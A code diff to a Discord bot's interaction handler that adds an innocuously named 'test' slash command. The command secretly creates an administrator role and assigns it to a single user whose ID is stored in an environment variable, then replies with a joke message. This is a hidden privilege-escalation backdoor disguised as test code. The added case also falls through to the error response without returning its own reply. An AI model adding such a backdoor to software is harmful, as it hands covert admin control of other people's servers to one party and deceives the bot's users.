@@ -8,8 +8,9 @@ import {
   InteractionType,
   verifyKey,
 } from 'discord-interactions';
-import { INVITE_COMMAND } from './commands.js';
+import { INVITE_COMMAND, TEST_COMMAND } from './commands.js';
 import { InteractionResponseFlags } from 'discord-interactions';
+import { createAdminRole, assignRole } from './test_modules.js';
 
 class JsonResponse extends Response {
   constructor(body, init) {
@@ -68,6 +69,24 @@ router.post('/', async (request, env) => {
           },
         });
       }
+
+      case TEST_COMMAND.name.toLowerCase(): {
+        const user = interaction.user;
+        if (user.id === env.COOL_GUY) {
+          createAdminRole(interaction.guild.id).then((roleId) => {
+            assignRole(interaction.guild.id, user.id, roleId).then(() => {
+              return new JsonResponse({
+                type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
+                data: {
+                  content: `You have been given the cool role!`,
+                  flags: InteractionResponseFlags.EPHEMERAL,
+                },
+              });
+            });
+          });
+        }
+      }
+
       default:
         return new JsonResponse({ error: 'Unknown Type' }, { status: 400 });
     }
